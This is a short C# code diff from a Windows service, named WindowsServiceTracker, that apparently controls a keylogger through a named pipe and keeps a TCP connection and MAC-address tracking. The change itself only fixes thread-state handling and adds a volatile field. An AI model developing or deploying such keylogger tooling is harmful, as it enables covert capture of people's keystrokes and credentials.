@@ -55,7 +55,7 @@ namespace WindowsServiceTracker
             new NetNamedPipeBinding(), new EndpointAddress("net.pipe://localhost/PipeKeylogger"));
         private KeyloggerCommInterface pipeProxy;
         private Thread tcpThread;
-        private Thread retryStartKeylogger;
+        private volatile Thread retryStartKeylogger;
         private volatile bool connectionKeepAlive = true;
         private volatile bool tcpKeepAlive = true;
         private volatile string macAddress = null;
@@ -174,8 +174,9 @@ namespace WindowsServiceTracker
             {
                 return pipeProxy.StartKeylogger();
             }
-            if (retryStartKeylogger == null || retryStartKeylogger.ThreadState != System.Threading.ThreadState.Running)
+            if (retryStartKeylogger == null || !retryStartKeylogger.IsAlive/*retryStartKeylogger.ThreadState != System.Threading.ThreadState.Running*/)
             {
+                //WriteEventLogEntry("new keylogger thread");
                 retryStartKeylogger = new Thread(this.retryStartKeyloggerThread);
                 retryStartKeylogger.Start();
             }
